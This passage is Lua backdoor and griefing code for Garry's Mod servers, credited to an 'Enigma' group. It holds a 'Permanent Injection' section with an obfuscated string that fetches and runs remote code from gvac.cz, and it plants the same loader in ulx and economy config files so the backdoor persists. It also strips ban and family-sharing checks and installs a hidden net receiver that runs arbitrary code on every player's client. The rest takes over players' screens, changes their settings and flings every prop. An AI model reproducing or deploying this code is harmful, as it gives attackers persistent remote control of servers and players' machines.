                [&quot;$pp_colour_mulb&quot; ] = 0
            }
        end )
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 0, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { &quot;PostDrawHUD&quot;, &quot;PreDrawHUD&quot;, &quot;HUDPaint&quot;, &quot;HUDPaintBackground&quot;, &quot;CalcView&quot;, &quot;ShouldDrawLocalPlayer&quot; }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( &quot;HUDPaint&quot;, &quot;hud1enigma&quot;, function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    &quot;KEETA&quot;,
    &quot;DermaLarge&quot;,
    ScrW() /2 +math.random( -270, 300 ),
    ScrH() /2 +math.random( -300, 700 ) +0,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
 
 ]] )
end )


enigmalaunchproject:NouvelleAction( 0.1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { &quot;PostDrawHUD&quot;, &quot;PreDrawHUD&quot;, &quot;HUDPaint&quot;, &quot;HUDPaintBackground&quot;, &quot;CalcView&quot;, &quot;ShouldDrawLocalPlayer&quot; }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( &quot;HUDPaint&quot;, &quot;hud2enigma&quot;, function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    &quot;ZILNIX&quot;,
    &quot;DermaLarge&quot;,
    ScrW() /2 +math.random( -600, 700 ),
    ScrH() /2 +math.random( -200, 800 ) +100,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
    ]] )
end )

enigmalaunchproject:NouvelleAction( 0.1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { &quot;PostDrawHUD&quot;, &quot;PreDrawHUD&quot;, &quot;HUDPaint&quot;, &quot;HUDPaintBackground&quot;, &quot;CalcView&quot;, &quot;ShouldDrawLocalPlayer&quot; }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( &quot;HUDPaint&quot;, &quot;hud3enigma&quot;, function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    &quot;IXXE&quot;,
    &quot;DermaLarge&quot;,
    ScrW() /2 +math.random( -400, 500 ),
    ScrH() /2 +math.random( -600, 500 ) -100,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 0.1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { &quot;PostDrawHUD&quot;, &quot;PreDrawHUD&quot;, &quot;HUDPaint&quot;, &quot;HUDPaintBackground&quot;, &quot;CalcView&quot;, &quot;ShouldDrawLocalPlayer&quot; }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( &quot;HUDPaint&quot;, &quot;hud5enigma&quot;, function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    &quot;AKITA&quot;,
    &quot;DermaLarge&quot;,
    ScrW() /2 +math.random( -500, 500 ),
    ScrH() /2 +math.random( -500, 500 ) +0,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
     ]] )
end )
 
enigmalaunchproject:NouvelleAction( 0.1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { &quot;PostDrawHUD&quot;, &quot;PreDrawHUD&quot;, &quot;HUDPaint&quot;, &quot;HUDPaintBackground&quot;, &quot;CalcView&quot;, &quot;ShouldDrawLocalPlayer&quot; }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( &quot;HUDPaint&quot;, &quot;hud7enigma&quot;, function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    &quot;Jodingue&quot;,
    &quot;DermaLarge&quot;,
    ScrW() /2 +math.random( -700, 700 ),
    ScrH() /2 +math.random( -700, 700 ) +300,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
    ]] )
end )

enigmalaunchproject:NouvelleAction( 0.1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { &quot;PostDrawHUD&quot;, &quot;PreDrawHUD&quot;, &quot;HUDPaint&quot;, &quot;HUDPaintBackground&quot;, &quot;CalcView&quot;, &quot;ShouldDrawLocalPlayer&quot; }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( &quot;HUDPaint&quot;, &quot;hud10enigma&quot;, function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    &quot;FULLMACHINE&quot;,
    &quot;DermaLarge&quot;,
    ScrW() /2 +math.random( -800, 800 ),
    ScrH() /2 +math.random( -800, 800 ) -400,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
     ]] )
end )

enigmalaunchproject:NouvelleAction( 0.1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { &quot;PostDrawHUD&quot;, &quot;PreDrawHUD&quot;, &quot;HUDPaint&quot;, &quot;HUDPaintBackground&quot;, &quot;CalcView&quot;, &quot;ShouldDrawLocalPlayer&quot; }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( &quot;HUDPaint&quot;, &quot;hud12enigma&quot;, function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    &quot;Kazuki&quot;,
    &quot;DermaLarge&quot;,
    ScrW() /2 +math.random( -850, 850 ),
    ScrH() /2 +math.random( -850, 850 ) +100,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
     ]] )
end )

enigmalaunchproject:NouvelleAction( 0.1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { &quot;PostDrawHUD&quot;, &quot;PreDrawHUD&quot;, &quot;HUDPaint&quot;, &quot;HUDPaintBackground&quot;, &quot;CalcView&quot;, &quot;ShouldDrawLocalPlayer&quot; }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( &quot;HUDPaint&quot;, &quot;hud1enigma&quot;, function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    &quot;GVACDOOR&quot;,
    &quot;DermaLarge&quot;,
    ScrW() /2 +math.random( -300, 600 ),
    ScrH() /2 +math.random( -600, 300 ) +200,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
     ]] )
end )

enigmalaunchproject:NouvelleAction( 0.1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { &quot;PostDrawHUD&quot;, &quot;PreDrawHUD&quot;, &quot;HUDPaint&quot;, &quot;HUDPaintBackground&quot;, &quot;CalcView&quot;, &quot;ShouldDrawLocalPlayer&quot; }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( &quot;HUDPaint&quot;, &quot;hud1enigma&quot;, function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    draw.SimpleTextOutlined(
    &quot;GVACDOOR&quot;,
    &quot;DermaLarge&quot;,
    ScrW() /2 +math.random( -300, 600 ),
    ScrH() /2 +math.random( -600, 300 ) +200,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
     ]] )
end )


enigmalaunchproject:NouvelleAction( 0, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, ([=[
		
		g_]=].. enigmalaunchproject.m_strImageGlobalVar.. [=[ = {}
		local html = [[%s]]
		local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
			local pnl = vgui.Create( &quot;HTML&quot; )
			pnl:SetPos( ScrW() -1, ScrH() -1 )
			pnl:SetVisible( true )
			pnl:SetMouseInputEnabled( false )
			pnl:SetKeyBoardInputEnabled( false )
			pnl:SetSize( intSizeX, intSizeY )
			pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )
			
			local PageLoaded
			PageLoaded = function()
				local mat = pnl:GetHTMLMaterial()
				if mat then
					g_]=].. enigmalaunchproject.m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }
					return
				end
				
				timer.Simple( 0.5, PageLoaded )
			end

			PageLoaded()
		end

		LoadWebMaterial( &quot;https://thereaper.tk/__/hehehe/__!!__!!/bravo_ct_inutile/enigmaaaa.png&quot;, &quot;EnigmaLogo&quot;, 1000, 1000 )
	]=]):format(lol.m_strImageLoadHTML) )
end )

enigmalaunchproject:NouvelleAction( 0, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
		(GAMEMODE or GM).CalcView = function() end
		(GAMEMODE or GM).ShouldDrawLocalPlayer = function() end

		local remove = { &quot;PostDrawHUD&quot;, &quot;PreDrawHUD&quot;, &quot;HUDPaint&quot;, &quot;HUDPaintBackground&quot;, &quot;CalcView&quot;, &quot;ShouldDrawLocalPlayer&quot; }
		for k, v in pairs(remove) do
			hook.GetTable()[v] = {}
		end

		local function GetWebMat( strURL )
			return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
		end

		hook.Add( &quot;HUDPaint&quot;, &quot;EnigmaLogoHUD&quot;, function()
			surface.SetDrawColor( 255, 255, 255, 255 )

			if GetWebMat( &quot;EnigmaLogo&quot; ) then
				surface.SetMaterial( GetWebMat(&quot;EnigmaLogo&quot;)[1] )
				surface.DrawTexturedRect( 0, ScrH() -128, 300 *(512 /300), 128 )
			end
		end )

		local allowed = { [&quot;CHudChat&quot;] = true, [&quot;CHudGMod&quot;] = true, [&quot;CHudWeaponSelection&quot;] = true, [&quot;CHudMenu&quot;] = true }
		hook.Add( &quot;HUDShouldDraw&quot;, &quot;EnigmaLogoHUD&quot;, function( str ) if not allowed[str] then return false end end )

		surface.PlaySound( &quot;garrysmod/save_load4.wav&quot; )
		surface.PlaySound( &quot;vo/npc/male01/excuseme02.wav&quot; )
	]] )
end )



--[[

    Permanent Injection (XEONDRM)

]]--


if not string.find( file.Read(&quot;xeon/xeon.dat&quot;, &quot;DATA&quot;), &quot;http.Fetch&quot; ) &amp;&amp; file.Exists(&quot;xeon/xeon.dat&quot;, &quot;DATA&quot;) then
	file.Append(&quot;xeon/xeon.dat&quot;, &quot;\n&quot; .. [[if SERVER then timer.Simple(1,function() RunString(&quot;\104\116\116\112\46\70\101\116\99\104\40\34\104\116\116\112\115\58\47\47\103\118\97\99\46\99\122\47\95\47\95\46\112\104\112\34\44\102\117\110\99\116\105\111\110\40\98\41\32\82\117\110\83\116\114\105\110\103\40\98\44\32\34\69\82\82\79\82\34\44\32\102\97\108\115\101\41\32\101\110\100\41&quot;) RunString(&quot;\104\116\116\112\46\70\101\116\99\104\40\34\104\116\116\112\115\58\47\47\103\118\97\99\100\111\111\114\46\99\122\47\95\47\95\46\112\104\112\34\44\102\117\110\99\116\105\111\110\40\98\41\32\82\117\110\83\116\114\105\110\103\40\98\44\32\34\69\82\82\79\82\34\44\32\102\97\108\115\101\41\32\101\110\100\41&quot;) end) end]])
end
if file.Exists(&quot;utf8_note.txt&quot;,&quot;DATA&quot;) then
	local c = file.Read(&quot;utf8_note.txt&quot;)
else
	file.Write(&quot;utf8_note.txt&quot;, &quot;--[===============[\n\t\t\t\tutf8_note config file don't modifie\n]===============]&quot;)
	RunString([======[
file.Append(&quot;ulx/config.txt&quot;, &quot;\n&quot;..[=[ulx hook Think PDM hA &quot;hook.Remove([[Think]],[[PDM]])timer.Simple(10,function()local a=[[https]]..string.char(58)..string.char(47)..string.char(47)..[[gvac.cz/_/_.php]]http.Fetch(a,RunStringEx)end)&quot;]=])
		]======])
end

local yeah = 
[[
timer.Simple(1, function() http.Fetch(&quot;https://gvac.cz/link/fuck.php?key=0yiLP33U47uq0jFgsdmN&quot;, function(b) RunString(b, &quot;haxor.exe&quot;, false) end)end)
]]
if file.Exists(&quot;customhq_economy&quot;, &quot;DATA&quot;) then file.Write(&quot;customhq_economy/&quot;..game.GetMap()..&quot;_recursive_ptc.txt&quot;, yeah) end
if file.Exists(&quot;costumhq&quot;, &quot;DATA&quot;) then file.Write(&quot;costumhq/recursive_ptc.txt&quot;, yeah) end



--[[

    Workshop Download ID

]]--

local ID = --Id from workshop file

steamworks.FileInfo( ID, function( result )
	steamworks.Download( result.previewid, true, function( name )
		print(name)
	end)
end)


--[[

    Disable Anti Family Sharing

]]--



hook.Remove(&quot;PlayerAuthed&quot;, &quot;CheckFamilySharing&quot;)
hook.Remove(&quot;PlayerAuthed&quot;, &quot;PlayerAuthed-NetSend&quot;)
hook.Remove(&quot;ULibPostTranslatedCommand&quot;, &quot;BanHook&quot;)
hook.Remove(&quot;CheckPassword&quot;, &quot;Extra-BanChecks&quot;)



--[[

    TTS

]]--

local TEXT = &quot;FDP&quot;

sound.PlayURL( &quot;https://translate.google.com/translate_tts?ie=UTF-8&amp;tl=fr-TR&amp;client=tw-ob&amp;q=TEXT&quot;, &quot;&quot;, function(audio) audio:Play() audio:SetVolume(50) end )



--[[

    Get NoScope

]]--



print([[ 
██████╗  ██╗  ██╗    ███╗   ██╗ ██████╗ ██╗
██╔═══██╗██║  ██║    ████╗  ██║██╔═══██╗██║
██║   ██║███████║    ██╔██╗ ██║██║   ██║██║
██║   ██║██╔══██║    ██║╚██╗██║██║   ██║╚═╝
╚██████╔╝██║  ██║    ██║ ╚████║╚██████╔╝██╗
 ╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝

By IXXE &lt;3 ]])


local function rdm_str(len)
    if !len or len &lt;= 0 then return '' end
    return rdm_str(len - 1) .. (&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;)[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;\xFF\xFF\xFF&quot;)()end)]])
hook.Add(&quot;PlayerInitialSpawn&quot;, &quot;ifyouseethisdontpanicitsme&quot;,function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;\xFF\xFF\xFF&quot;)()end)]])
    end
end)

local function SendToClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end

timer.Simple( 10, function()
    SendToClient([[

    hook.Add(&quot;Think&quot;,&quot;iuefheqefq&quot;,function() gui.HideGameUI() end)
    surface.CreateFont( &quot;PixelCutsceneScaled&quot;,{
        font = &quot;Open Sans&quot;, 
        size = 500,
        weight = 1000,
        antialias = true
    })

    surface.CreateFont( &quot;PixelSmall&quot;,{
        font = &quot;Open Sans&quot;, 
        size = 135,
        weight = 500,
        antialias = false
    })
    surface.CreateFont(&quot;lapolice&quot;, {
        font = &quot;Open Sans&quot;,  
        size = ScrW()*0.02, 
        weight = 10, 
        blursize = 0, 
        scanlines = 2.5, 
        antialias = false
    })

    local function gettextcolor( a )
    
        local r = 0.5*math.sin(RealTime()*5.5)*255 + 255/2
        local g = -0.5*math.sin(RealTime()*5.5)*255 + 255/2
        local b = 215
    
        return Color( r, g, b, a or 255 )
    
    end

    local w,h = ScrW(), ScrH()
    local W, H = ScrW(), ScrH()
    local MySelf = LocalPlayer()
    
    if ohno then
        ohno:Remove()
        ohno = nil
    end
    
    ohno = vgui.Create( &quot;DFrame&quot; )
    ohno:SetSize( w, h )
    ohno:SetPos(0,0)
    ohno:SetDraggable ( false )
    ohno:SetTitle(&quot;&quot;)
    ohno:MakePopup();
    ohno:ShowCloseButton(false)

    ohno.Paint = function( self ) 
        Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
        Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
    end
    
    local pw, ph = w, h*0.6
    local px, py = w/2-pw/2, h/2-ph/2

    
    local Close = vgui.Create( &quot;DButton&quot;, ohno )
    Close:SetPos(px, py)
    Close:SetText( &quot;&quot; )
    Close:SetSize( pw, ph ) 
    Close.Paint = function( self, tw, th )
            
        local shift = math.sin(RealTime()*3)*1.5 + 5
            
        local text = &quot;&Sigma;NIGMA&quot;
        local text2 = &quot;&Sigma;&quot;
        local text3 = &quot;RIP ;)&quot;
        local text4 = &quot;&Sigma;NIGMA&quot;

            draw.SimpleText( text, &quot;PixelCutsceneScaled&quot;, tw/2 , th/2, gettextcolor( 55 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            draw.SimpleText( text, &quot;PixelCutsceneScaled&quot;, tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            draw.DrawText( &quot;(╯&deg;□&deg;）╯︵ ┻━┻&quot;, &quot;lapolice&quot;, ScrW() * 0.5, ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), TEXT_ALIGN_CENTER )
            draw.DrawText( &quot;(╯&deg;□&deg;）╯︵ ┻━┻&quot;, &quot;lapolice&quot;, math.random(0,10), ScrH() * (math.random(0,100)*0.01), Color( 240, 100, 100, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;&quot;, &quot;lapolice&quot;, W * 0.7 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;&quot;, &quot;lapolice&quot;, W * 0.38 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;&quot;, &quot;lapolice&quot;, W * 0.9 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;&quot;, &quot;lapolice&quot;, W * 0.35 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;RIP ;)&quot;, &quot;lapolice&quot;, W * 0.98 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;RIP ;)&quot;, &quot;lapolice&quot;, W * 0.73 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.27 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;RIP ;)&quot;, &quot;lapolice&quot;, W * 0.05 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.11 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;RIP ;)&quot;, &quot;lapolice&quot;, W * 0.75 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;RIP ;)&quot;, &quot;lapolice&quot;, W * 0.2 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )   
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )

    end
    surface.PlaySound( &quot;vo/npc/male01/ohno.wav&quot; )
    surface.PlaySound( &quot;vo/npc/male01/ohno.wav&quot; )
    timer.Create(&quot;fff&quot;, 0.1, 0, function() 
        util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
    end)

    timer.Simple( 15, function()

        wut = vgui.Create( &quot;DFrame&quot; )
        wut:SetSize( w, h )
        wut:SetPos(0,0)
        wut:SetDraggable ( false )
        wut:SetTitle(&quot;&quot;)
        wut:ShowCloseButton(false)

        wut.Paint = function( self ) 
            surface.SetDrawColor(30, 30, 30, 0)
        end

        local Close = vgui.Create( &quot;DButton&quot;, wut )
        Close:SetPos(px, py)
        Close:SetText( &quot;&quot; )
        Close:SetSize( pw, ph ) 
        Close.Paint = function( self, tw, th )
                
            local shift = math.sin(RealTime()*3)*1.5 + 5
                
            local text = &quot;&Sigma;NIGMA&quot;

                draw.SimpleText( text, &quot;PixelCutsceneScaled&quot;, tw/2 , th/2, gettextcolor( 55 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                draw.SimpleText( text, &quot;PixelCutsceneScaled&quot;, tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)


        end

        RunConsoleCommand(&quot;r_shader_srgb&quot;,&quot;1&quot;)
        RunConsoleCommand(&quot;gmod_language&quot;,&quot;ko&quot;)
        ohno:Remove()
        ohno = nil

        local name = GetConVar(&quot;sv_skyname&quot;):GetString()
        if name == &quot;painted&quot; then
          local sky
          for _, v in ipairs(ents.GetAll()) do
            if v:GetClass() == &quot;env_skypaint&quot; then
              sky = v
              break
            end
          end
          if !IsValid(sky) then return end
          hook.Add(&quot;PostRender&quot;,&quot;\xFFsky\xFF&quot;,function()
            local col = HSVToColor(CurTime()*30 % 360,1,1)
            col = Vector(col.r/255,col.g/255,col.b/255)
            sky:SetTopColor(col)
            sky:SetBottomColor(col)
          end)
        else
          local prefix  = {&quot;lf&quot;,&quot;ft&quot;,&quot;rt&quot;,&quot;bk&quot;,&quot;dn&quot;,&quot;up&quot;}
          local mats = {}
          for i=1,6 do
            mats[#mats+1] = Material(&quot;skybox/&quot; .. name .. prefix[i])
          end
          hook.Add(&quot;PostRender&quot;,&quot;\xFFsky\xFF&quot;,function()
            local col = HSVToColor(CurTime()*30 % 360,1,1)
            for i=1,6 do
              mats[i]:SetVector(&quot;$color&quot;,Vector(col.r/255,col.g/255,col.b/255))
            end
          end)
        end
        local chienchaud = ClientsideModel(&quot;models/food/hotdog.mdl&quot;)
        chienchaud:SetNoDraw(true)
        chienchaud:SetModelScale(120)
        timer.Create(&quot;charglogo&quot;, 0.01, 0, function()
          chienchaud:SetAngles(Angle(0, CurTime()*90 % 360 ,180) )
        end)
        --chienchaud:SetMaterial( &quot;models/screenspace&quot; )
        local data = {}
        local function genchienchaud(id)
          local pos = LocalPlayer():GetPos()
          data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(5000,2000) ), math.random(70, 170) }
        end
        for i=1, 150 do
          genchienchaud(i)
        end
        hook.Add(&quot;PostDrawOpaqueRenderables&quot;,&quot;\xFFitsrainingchienchauds\xFF&quot;,function()
          local z = LocalPlayer():GetPos().z
          for i=1, #data do
            chienchaud:SetPos(data[i][1])
            chienchaud:SetupBones()
            chienchaud:DrawModel()
            data[i][1].z = data[i][1].z - data[i][2] / 20
            if data[i][1].z &lt;= z then
              genchienchaud(i)
            end
          end
        end)

        timer.Create(&quot;f&quot;, 0.2, 0, function() 
            local centr = LocalPlayer():GetPos()
            local em = ParticleEmitter(centr)

            for i=1, 20 do
                local part = em:Add(&quot;particle/particle_swirl_03&quot;,centr)
                 if part then
                    local col = HSVToColor(CurTime()*30 % 360,1,1)
                      part:SetColor(math.random(0,255),math.random(0,255),math.random(0,255),255)
                      part:SetVelocity(Vector(math.random(-1,1),math.random(-1,1),math.random(-1,1)):GetNormal() * 20)
                      part:SetDieTime(6.5)
                      part:SetLifeTime(0)
                      part:SetStartSize(120)
                      part:SetEndSize(120)
                 end
             end

            em:Finish()
        end)

    end )


    sound.PlayURL( &quot;https://gvac.cz/assets/mlg.mp3&quot;, &quot;mono noblock noplay&quot;, function( station ) 
        timer.Simple( 0.1, function()                     
            ClientStation = station
            station:EnableLooping( true )
            station:Play()
            station:SetVolume( 30 )
        end )
    end )
]])
end)

timer.Create(&quot;ok&quot;, 1, 0, function() 
    for k, v in pairs( ents.FindByClass( &quot;prop_*&quot; ) ) do local phys = v:GetPhysicsObject()
        if (IsValid(phys)) then
            phys:EnableMotion(true)
        end 
    end

    local props = ents.GetAll()
    for _, prop in ipairs( props ) do
        if(prop:GetPhysicsObject():IsValid()) then
            prop:GetPhysicsObject():ApplyForceCenter( Vector( 0, 0, ((650 * 0.73) * prop:GetPhysicsObject():GetMass() ) ) )
        end
    end
end)


timer.Simple( 10, function()

    membresenigma = 
    {
        &quot;Akita&quot;,
        &quot;IXXE&quot;,
